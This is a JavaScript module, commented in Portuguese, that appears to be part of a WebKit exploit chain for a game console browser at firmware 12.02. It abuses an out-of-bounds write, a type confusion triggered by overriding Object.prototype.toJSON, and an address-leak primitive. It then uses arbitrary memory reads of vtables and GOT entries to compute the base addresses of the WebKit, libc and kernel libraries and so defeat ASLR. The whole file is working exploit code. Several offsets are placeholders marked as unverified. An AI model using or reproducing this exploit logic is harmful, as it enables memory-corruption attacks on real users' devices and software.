// discover_bases_12_02.mjs (Atualizado para usar a lógica addrof do OriginalHeisenbug_Plus_Addrof_v1)

import { logS3, PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs'; // Adicionado SHORT_PAUSE_S3
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    arb_read, // Ainda necessário para ler da memória após o addrof e para ler GOT/VTable
    triggerOOB_primitive,
    oob_array_buffer_real, // Usado para checar limites e pela lógica do Heisenbug
    oob_write_absolute,   // Usado pela lógica do Heisenbug
    isOOBReady,
    clearOOBEnvironment   // Importado para limpeza
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// =======================================================================================
// Variáveis Globais para Endereços Base e Lógica Addrof V28
// =======================================================================================
export let libSceNKWebkit_base_address_1202 = null;
export let libSceLibcInternal_base_address_1202 = new AdvancedInt64(0x180AC8000);
export let libkernel_base_address_1202 = new AdvancedInt64(0x80FCA0000);

logS3(`[DiscoverBases] VALORES PRÉ-DEFINIDOS CARREGADOS:`, "info");
if (libSceLibcInternal_base_address_1202) logS3(`  Libc Base (pré-definido): ${libSceLibcInternal_base_address_1202.toString(true)}`, "info");
if (libkernel_base_address_1202) logS3(`  Libkernel Base (pré-definido): ${libkernel_base_address_1202.toString(true)}`, "info");

// Variáveis necessárias para a lógica do addrof_via_heisenbug_v28_logic
let _toJSON_call_details_for_addrof_v28 = null;
let _victim_ab_ref_for_addrof_v28 = null;
let _object_to_leak_for_addrof_v28 = null;

const CRITICAL_OOB_WRITE_VALUE_FOR_V28_ADDROF  = 0xFFFFFFFF;
const VICTIM_AB_SIZE_FOR_V28_ADDROF = 64;
// TODO_USUARIO_1202_ADDROF_V28_TARGET_OFFSET: Este é o crucial offset 0x7C do seu teste.
// Verifique se ele é relativo ao início do oob_array_buffer_real e o que ele corrompe.
const CORRUPTION_TARGET_OFFSET_FOR_V28_ADDROF = 0x7C;


// =======================================================================================
// Constantes de Offsets para Descoberta de Base (PRECISAM SER VERIFICADAS/ENCONTRADAS PARA O 12.02)
// =======================================================================================
const OFFSET_JS_DOM_OBJ_TO_WEBCORE_IMPL_1202 = new AdvancedInt64(0x18);
const OFFSET_WEBCORE_VTABLE_TO_KNOWN_WEBKIT_FUNC_1202 = new AdvancedInt64(0x1B8);
const RELATIVE_OFFSET_OF_KNOWN_WEBKIT_FUNC_IN_LIB_1202 = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"] || 0xABC000);

const RELATIVE_OFFSET_GOT_ENTRY_FOR_LIBC_FUNC_IN_WEBKIT_1202 = new AdvancedInt64(0x3D00000);
const RELATIVE_OFFSET_OF_LIBC_FUNC_IN_LIBC_LIB_1202 = new AdvancedInt64(0x20000);

const RELATIVE_OFFSET_GOT_ENTRY_FOR_LIBKERNEL_FUNC_IN_WEBKIT_1202 = new AdvancedInt64(0x3E00000);
const RELATIVE_OFFSET_OF_LIBKERNEL_FUNC_IN_LIBKERNEL_LIB_1202 = new AdvancedInt64(0x0C000);

// =======================================================================================
// Lógica Addrof (Replicada do OriginalHeisenbug_Plus_Addrof_v1)
// =======================================================================================

function toJSON_Probe_For_V28_AddrofAttempt() {
    _toJSON_call_details_for_addrof_v28 = {
        probe_variant: "V28_Probe_In_DiscoverBases",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        probe_called: false
    };
    try {
        _toJSON_call_details_for_addrof_v28.probe_called = true;
        _toJSON_call_details_for_addrof_v28.this_type_in_toJSON = Object.prototype.toString.call(this);
        // Este log pode ser muito verboso se chamado múltiplas vezes.
        // logS3(`[toJSON_Probe_For_V28_AddrofAttempt] 'this' type: ${_toJSON_call_details_for_addrof_v28.this_type_in_toJSON}`, "info");

        if (this === _victim_ab_ref_for_addrof_v28 && _toJSON_call_details_for_addrof_v28.this_type_in_toJSON === '[object Object]') {
            logS3(`[toJSON_Probe_For_V28_AddrofAttempt] HEISENBUG CONFIRMADA! Tentando escrever objeto alvo em this[0]...`, "vuln");
            if (_object_to_leak_for_addrof_v28) {
                this[0] = _object_to_leak_for_addrof_v28;
                logS3(`[toJSON_Probe_For_V28_AddrofAttempt] Escrita de referência em this[0] (supostamente) realizada.`, "info");
            } else {
                logS3(`[toJSON_Probe_For_V28_AddrofAttempt] _object_to_leak_for_addrof_v28 é null. Escrita não tentada.`, "warn");
            }
        } else if (this === _victim_ab_ref_for_addrof_v28) {
            // Log apenas se for o victim_ab mas não houve confusão de tipo ainda.
            // logS3(`[toJSON_Probe_For_V28_AddrofAttempt] Heisenbug NÃO confirmada (this === victim_ab). Tipo: ${_toJSON_call_details_for_addrof_v28.this_type_in_toJSON}`, "info");
        }
    } catch (e) {
        _toJSON_call_details_for_addrof_v28.error_in_toJSON = `${e.name}: ${e.message}`;
        logS3(`[toJSON_Probe_For_V28_AddrofAttempt] ERRO na sonda: ${e.name} - ${e.message}`, "error");
    }
    return { minimal_probe_executed_for_v28_addrof: true };
}

async function addrof_via_heisenbug_v28_logic(objectToLeak) {
    const FNAME_ADDROF = "addrof_via_heisenbug_v28_logic";
    logS3(`--- Iniciando ${FNAME_ADDROF} ---`, "test");

    _toJSON_call_details_for_addrof_v28 = null;
    _victim_ab_ref_for_addrof_v28 = null;
    _object_to_leak_for_addrof_v28 = objectToLeak; // Configura o objeto a ser vazado

    let addrof_result = {
        success: false,
        leaked_address_as_double: null,
        leaked_address_as_int64: null,
        message: "Addrof V28 não tentado ou Heisenbug não ocorreu."
    };

    // PASSO 0: triggerOOB_primitive é chamado no início de discoverAllBases_1202
    // Garanta que ele seja a versão v31 que expande m_length do oob_dataview_real para 0xFFFFFFFF
    // para que arb_read (usado posteriormente em discoverAllBases_1202) funcione.
    // A ausência do log "m_length ... expandido" nos seus logs do OriginalHeisenbug_Plus_Addrof_v1 é uma preocupação.
    if (!isOOBReady()) {
         logS3(`[${FNAME_ADDROF}] OOB não pronto, chamando triggerOOB_primitive. ESSENCIAL QUE EXpanda m_length de oob_dataview_real!`, "warn");
         await triggerOOB_primitive({ force_reinit: true }); // Forçar re-init se não estava pronto
         if (!isOOBReady()) {
            addrof_result.message = "Falha crítica: Ambiente OOB não pôde ser inicializado para addrof_V28.";
            logS3(addrof_result.message, "critical", FNAME_ADDROF);
            return addrof_result;
         }
    }
    logS3(`[${FNAME_ADDROF}] Ambiente OOB pronto. Alvo da corrupção OOB: ${toHex(CORRUPTION_TARGET_OFFSET_FOR_V28_ADDROF)}`, "info");

    logS3(`[${FNAME_ADDROF}] Escrevendo ${toHex(CRITICAL_OOB_WRITE_VALUE_FOR_V28_ADDROF)} em oob_array_buffer_real[${toHex(CORRUPTION_TARGET_OFFSET_FOR_V28_ADDROF)}]...`, "info");
    oob_write_absolute(CORRUPTION_TARGET_OFFSET_FOR_V28_ADDROF, CRITICAL_OOB_WRITE_VALUE_FOR_V28_ADDROF, 4);
    logS3(`[${FNAME_ADDROF}] Escrita OOB crítica realizada.`, "info");

    await PAUSE_S3(SHORT_PAUSE_S3); // Pausa curta como no seu script original

    _victim_ab_ref_for_addrof_v28 = new ArrayBuffer(VICTIM_AB_SIZE_FOR_V28_ADDROF);
    let float64_view_on_victim = new Float64Array(_victim_ab_ref_for_addrof_v28);
    const fillPattern = Date.now() / 10000000000000; // Padrão um pouco mais dinâmico
    float64_view_on_victim.fill(fillPattern);

    logS3(`[${FNAME_ADDROF}] victim_ab criado. View preenchida com ${fillPattern}. Tentando JSON.stringify...`, "info");

    const ppKey = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
    let pollutionApplied = false;
    let stringifyOutput = null;

    try {
        Object.defineProperty(Object.prototype, ppKey, {
            value: toJSON_Probe_For_V28_AddrofAttempt,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        logS3(`[${FNAME_ADDROF}] Object.prototype.toJSON poluído. Chamando JSON.stringify...`, "info");

        stringifyOutput = JSON.stringify(_victim_ab_ref_for_addrof_v28);
        logS3(`[${FNAME_ADDROF}] JSON.stringify completou. Resultado da sonda (stringify): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info");
        logS3(`[${FNAME_ADDROF}] Detalhes da sonda (_toJSON_call_details_for_addrof_v28): ${JSON.stringify(_toJSON_call_details_for_addrof_v28)}`, "leak");

        if (_toJSON_call_details_for_addrof_v28 && _toJSON_call_details_for_addrof_v28.probe_called && _toJSON_call_details_for_addrof_v28.this_type_in_toJSON === "[object Object]") {
            logS3(`[${FNAME_ADDROF}] HEISENBUG CONFIRMADA (via _toJSON_call_details_for_addrof_v28)! Tipo de 'this': ${_toJSON_call_details_for_addrof_v28.this_type_in_toJSON}`, "vuln");

            const value_read_as_double = float64_view_on_victim[0];
            addrof_result.leaked_address_as_double = value_read_as_double;
            logS3(`[${FNAME_ADDROF}] Valor lido de float64_view_on_victim[0]: ${value_read_as_double}`, "leak");

            const double_buffer = new ArrayBuffer(8);
            (new Float64Array(double_buffer))[0] = value_read_as_double;
            const int32_view = new Uint32Array(double_buffer);
            addrof_result.leaked_address_as_int64 = new AdvancedInt64(int32_view[0], int32_view[1]);
            logS3(`[${FNAME_ADDROF}] Interpretado como Int64: ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak");

            if (value_read_as_double !== 0 && value_read_as_double !== fillPattern &&
                (addrof_result.leaked_address_as_int64.high() < 0x00020000 || (addrof_result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000)) {
                logS3(`[${FNAME_ADDROF}] !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!`, "vuln");
                addrof_result.success = true;
                addrof_result.message = "Heisenbug V28 confirmada E leitura de double sugere um ponteiro.";
            } else {
                addrof_result.message = "Heisenbug V28 confirmada, mas valor lido não parece ponteiro ou buffer não foi alterado.";
                logS3(`[${FNAME_ADDROF}] INFO: ${addrof_result.message} (Valor lido: ${value_read_as_double}, Padrão: ${fillPattern})`, "warn");
            }
        } else {
            let msg = "Heisenbug V28 (this como [object Object]) não foi confirmada via _toJSON_call_details_for_addrof_v28.";
            if(_toJSON_call_details_for_addrof_v28) msg += ` Tipo obs: ${_toJSON_call_details_for_addrof_v28.this_type_in_toJSON}`;
            addrof_result.message = msg;
            logS3(`[${FNAME_ADDROF}] ALERTA: ${addrof_result.message}`, "error");
        }
    } catch (e_str) {
        logS3(`[${FNAME_ADDROF}] ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}`, "critical");
        addrof_result.message = `Erro na execução principal do Addrof V28: ${e_str.name} - ${e_str.message}`;
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
            else delete Object.prototype[ppKey];
        }
        // Limpar referências globais do módulo addrof
        _object_to_leak_for_addrof_v28 = null;
        _victim_ab_ref_for_addrof_v28 = null;
        // Não limpar o ambiente OOB aqui, pois discoverAllBases_1202 pode precisar dele para arb_read.
        // clearOOBEnvironment(); // Movido para o final de discoverAllBases_1202
    }
    logS3(`--- ${FNAME_ADDROF} Concluído --- Resultado: Success=${addrof_result.success}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn");
    return addrof_result;
}


// Função addrof_1202 agora usa a nova lógica
async function addrof_1202(object) {
    logS3(`[Addrof1202_Wrapper] Tentando obter endereço de: ${typeof object} usando Heisenbug_v28_logic`, "info");
    const result = await addrof_via_heisenbug_v28_logic(object); // Chama a nova lógica
    if (result && result.success && result.leaked_address_as_int64) {
        logS3(`[Addrof1202_Wrapper] Endereço vazado (AdvancedInt64): ${result.leaked_address_as_int64.toString(true)}`, "leak");
        return result.leaked_address_as_int64;
    }
    logS3(`[Addrof1202_Wrapper] Falha ao obter endereço. Detalhes: ${result ? result.message : 'sem resultado'}`, "error");
    throw new Error(`addrof_1202_wrapper falhou. ${result ? result.message : 'addrof_via_heisenbug_v28_logic retornou resultado inesperado.'}`);
}

// =======================================================================================
// Funções de Descoberta de Base (usando a nova addrof_1202)
// =======================================================================================
function isAddrValid(addrInstance) {
    return addrInstance && isAdvancedInt64Object(addrInstance) && (addrInstance.low() !== 0 || addrInstance.high() !== 0);
}

async function find_libSceNKWebkit_base_1202() {
    const FNAME = "find_libSceNKWebkit_base_1202";
    logS3(`--- Iniciando ${FNAME} ---`, "test");

    if (isAddrValid(libSceNKWebkit_base_address_1202)) {
        logS3(`[${FNAME}] Usando base da libSceNKWebkit pré-definido/já encontrado: ${libSceNKWebkit_base_address_1202.toString(true)}`, "info");
        return libSceNKWebkit_base_address_1202;
    }
    let domObject = null;
    try {
        domObject = document.createElement('textarea');
        document.body.appendChild(domObject); // Adicionar ao DOM pode ser necessário

        const jsDomObjectAddr = await addrof_1202(domObject); // Usa a nova addrof_1202

        const webcoreImplAddrPtr = jsDomObjectAddr.add(OFFSET_JS_DOM_OBJ_TO_WEBCORE_IMPL_1202);
        const webcoreImplAddr = await arb_read(webcoreImplAddrPtr, 8);
        if (!isAddrValid(webcoreImplAddr)) {
            throw new Error(`Falha ao ler ponteiro WebCore de ${webcoreImplAddrPtr.toString(true)}`);
        }
        logS3(`[${FNAME}] Endereço da impl WebCore: ${webcoreImplAddr.toString(true)}`, "leak");

        const vtableAddr = await arb_read(webcoreImplAddr, 8);
        if (!isAddrValid(vtableAddr)) {
            throw new Error(`Falha ao ler ponteiro VTable de ${webcoreImplAddr.toString(true)}`);
        }
        logS3(`[${FNAME}] Endereço da VTable: ${vtableAddr.toString(true)}`, "leak");

        const knownWebkitFuncPtrAddr = vtableAddr.add(OFFSET_WEBCORE_VTABLE_TO_KNOWN_WEBKIT_FUNC_1202);
        const knownWebkitFuncAddr = await arb_read(knownWebkitFuncPtrAddr, 8);
        if (!isAddrValid(knownWebkitFuncAddr)) {
            throw new Error(`Falha ao ler ponteiro de função WebKit da VTable em ${knownWebkitFuncPtrAddr.toString(true)}`);
        }
        logS3(`[${FNAME}] Endereço da função WebKit (via VTable): ${knownWebkitFuncAddr.toString(true)}`, "leak");

        libSceNKWebkit_base_address_1202 = knownWebkitFuncAddr.sub(RELATIVE_OFFSET_OF_KNOWN_WEBKIT_FUNC_IN_LIB_1202);
        logS3(`SUCESSO! Base da libSceNKWebkit.sprx (12.02) calculado: ${libSceNKWebkit_base_address_1202.toString(true)}`, "good", FNAME);
        
        return libSceNKWebkit_base_address_1202;
    } catch (e) {
        logS3(`ERRO em ${FNAME}: ${e.message}`, "critical", FNAME);
        if (e.stack && typeof e.stack === 'string') logS3(e.stack, "critical", FNAME);
        libSceNKWebkit_base_address_1202 = null;
        throw e;
    } finally {
        if (domObject && domObject.parentNode) {
            domObject.parentNode.removeChild(domObject);
            logS3(`[${FNAME}] Textarea removido do DOM.`, "info");
        }
    }
}

async function find_libc_base_1202() {
    const FNAME = "find_libc_base_1202";
    // Restante da função find_libc_base_1202 permanece o mesmo da versão anterior...
    // (usando isAddrValid e a lógica de descoberta dinâmica se não pré-setado)
    logS3(`--- Iniciando ${FNAME} ---`, "test");

    if (isAddrValid(libSceLibcInternal_base_address_1202)) {
        logS3(`[${FNAME}] Usando base da libSceLibcInternal pré-definido: ${libSceLibcInternal_base_address_1202.toString(true)}`, "info");
        return libSceLibcInternal_base_address_1202;
    }
    logS3(`[${FNAME}] Base da libSceLibcInternal não pré-definido ou é zero. Tentando descoberta dinâmica...`, "warn");

    if (!isAddrValid(libSceNKWebkit_base_address_1202)) {
        throw new Error("Base da libSceNKWebkit é necessária para descoberta dinâmica da libc.");
    }
    try {
        const gotEntryLibcFuncAddr = libSceNKWebkit_base_address_1202.add(RELATIVE_OFFSET_GOT_ENTRY_FOR_LIBC_FUNC_IN_WEBKIT_1202);
        const libcFuncAddr = await arb_read(gotEntryLibcFuncAddr, 8);
        if (!isAddrValid(libcFuncAddr)) {
            throw new Error(`Falha ao ler endereço de função libc válido da GOT em ${gotEntryLibcFuncAddr.toString(true)}`);
        }
        libSceLibcInternal_base_address_1202 = libcFuncAddr.sub(RELATIVE_OFFSET_OF_LIBC_FUNC_IN_LIBC_LIB_1202);
        logS3(`SUCESSO! Base da libSceLibcInternal.sprx (12.02) calculado dinamicamente: ${libSceLibcInternal_base_address_1202.toString(true)}`, "good", FNAME);
        return libSceLibcInternal_base_address_1202;
    } catch (e) {
        logS3(`ERRO em ${FNAME} (descoberta dinâmica): ${e.message}`, "critical", FNAME);
        libSceLibcInternal_base_address_1202 = null;
        throw e;
    }
}

async function find_libkernel_base_1202() {
    const FNAME = "find_libkernel_base_1202";
    // Restante da função find_libkernel_base_1202 permanece o mesmo da versão anterior...
    // (usando isAddrValid e a lógica de descoberta dinâmica se não pré-setado)
    logS3(`--- Iniciando ${FNAME} ---`, "test");
    if (isAddrValid(libkernel_base_address_1202)) {
        logS3(`[${FNAME}] Usando base da libkernel pré-definido: ${libkernel_base_address_1202.toString(true)}`, "info");
        return libkernel_base_address_1202;
    }
    logS3(`[${FNAME}] Base da libkernel não pré-definido ou é zero. Tentando descoberta dinâmica...`, "warn");

    if (!isAddrValid(libSceNKWebkit_base_address_1202)) {
        throw new Error("Base da libSceNKWebkit é necessária para descoberta dinâmica da libkernel.");
    }
    try {
        const gotEntryLibkernelFuncAddr = libSceNKWebkit_base_address_1202.add(RELATIVE_OFFSET_GOT_ENTRY_FOR_LIBKERNEL_FUNC_IN_WEBKIT_1202);
        const libkernelFuncAddr = await arb_read(gotEntryLibkernelFuncAddr, 8);
        if (!isAddrValid(libkernelFuncAddr)) {
            throw new Error(`Falha ao ler endereço de função libkernel válido da GOT em ${gotEntryLibkernelFuncAddr.toString(true)}`);
        }
        libkernel_base_address_1202 = libkernelFuncAddr.sub(RELATIVE_OFFSET_OF_LIBKERNEL_FUNC_IN_LIBKERNEL_LIB_1202);
        logS3(`SUCESSO! Base da libkernel.sprx (12.02) calculado dinamicamente: ${libkernel_base_address_1202.toString(true)}`, "good", FNAME);
        return libkernel_base_address_1202;
    } catch (e) {
        logS3(`ERRO em ${FNAME} (descoberta dinâmica): ${e.message}`, "critical", FNAME);
        libkernel_base_address_1202 = null;
        throw e;
    }
}

export async function discoverAllBases_1202() {
    const FNAME = "discoverAllBases_1202";
    logS3(`--- Iniciando Descoberta de Todos os Endereços Base (12.02) ---`, "test", FNAME);
    let webkitBaseFound = false;
    let libcBaseFound = false;
    let libkernelBaseFound = false;
    let overallError = null;

    try {
        if (!isOOBReady()) {
            logS3(`[${FNAME}] Ambiente OOB não está pronto. Tentando inicializar...`, "warn");
            // Importante: triggerOOB_primitive DEVE expandir m_length do oob_dataview_real para arb_read funcionar!
            await triggerOOB_primitive({ force_reinit: true });
            if (!isOOBReady()) {
                throw new Error("Falha ao inicializar o ambiente OOB para descoberta de bases.");
            }
            logS3(`[${FNAME}] Ambiente OOB inicializado. Verifique se m_length de oob_dataview_real foi expandido!`, "info");
        }

        try {
            await find_libSceNKWebkit_base_1202();
            if (isAddrValid(libSceNKWebkit_base_address_1202)) {
                webkitBaseFound = true;
            }
        } catch (e) {
            logS3(`[${FNAME}] Falha ao tentar encontrar base da WebKit: ${e.message}`, "error");
            overallError = e;
        }

        if (isAddrValid(libSceLibcInternal_base_address_1202)) {
            libcBaseFound = true;
            logS3(`[${FNAME}] Usando Libc base pré-definido/confirmado: ${libSceLibcInternal_base_address_1202.toString(true)}`, "info");
        } else if (webkitBaseFound) {
            try {
                await find_libc_base_1202();
                 if (isAddrValid(libSceLibcInternal_base_address_1202)) {
                    libcBaseFound = true;
                }
            } catch (e) {
                logS3(`[${FNAME}] Falha ao tentar encontrar base da Libc dinamicamente: ${e.message}`, "error");
                if (!overallError) overallError = e;
            }
        } else {
             logS3(`[${FNAME}] Pulando descoberta da Libc pois WebKit base não foi encontrado e Libc não estava pré-setado válido.`, "warn");
        }

        if (isAddrValid(libkernel_base_address_1202)) {
            libkernelBaseFound = true;
            logS3(`[${FNAME}] Usando Libkernel base pré-definido/confirmado: ${libkernel_base_address_1202.toString(true)}`, "info");
        } else if (webkitBaseFound) {
            try {
                await find_libkernel_base_1202();
                if (isAddrValid(libkernel_base_address_1202)) {
                    libkernelBaseFound = true;
                }
            } catch (e) {
                logS3(`[${FNAME}] Falha ao tentar encontrar base da Libkernel dinamicamente: ${e.message}`, "error");
                if (!overallError) overallError = e;
            }
        } else {
            logS3(`[${FNAME}] Pulando descoberta da Libkernel pois WebKit base não foi encontrado e Libkernel não estava pré-setado válido.`, "warn");
        }

        if (overallError) {
             throw overallError;
        }

    } catch (e) {
        logS3(`ERRO GERAL em ${FNAME}: ${e.message}`, "critical", FNAME);
        return {
            success: false,
            error: e.message,
            webkitBase: libSceNKWebkit_base_address_1202,
            libcBase: libSceLibcInternal_base_address_1202,
            libkernelBase: libkernel_base_address_1202
        };
    } finally {
        // Limpar ambiente OOB APENAS se este módulo for o responsável final por ele.
        // Se outros módulos o utilizam depois, a limpeza deve ser coordenada.
        // Por agora, vamos manter como estava, mas é um ponto de atenção.
        // clearOOBEnvironment();
    }
    
    const allBasesSuccessfullyDetermined = webkitBaseFound && libcBaseFound && libkernelBaseFound;
    logS3(`--- Descoberta de Bases Concluída (12.02) ---`, "test", FNAME);
    logS3(`  libSceNKWebkit Base: ${webkitBaseFound ? libSceNKWebkit_base_address_1202.toString(true) : "NÃO ENCONTRADO/CONFIRMADO"}`, "result", FNAME);
    logS3(`  libSceLibcInternal Base: ${libcBaseFound ? libSceLibcInternal_base_address_1202.toString(true) : "NÃO ENCONTRADO/CONFIRMADO"}`, "result", FNAME);
    logS3(`  libkernel Base: ${libkernelBaseFound ? libkernel_base_address_1202.toString(true) : "NÃO ENCONTRADO/CONFIRMADO"}`, "result", FNAME);

    return {
        success: allBasesSuccessfullyDetermined,
        webkitBase: webkitBaseFound ? libSceNKWebkit_base_address_1202 : null,
        libcBase: libcBaseFound ? libSceLibcInternal_base_address_1202 : null,
        libkernelBase: libkernelBaseFound ? libkernel_base_address_1202 : null
    };
}
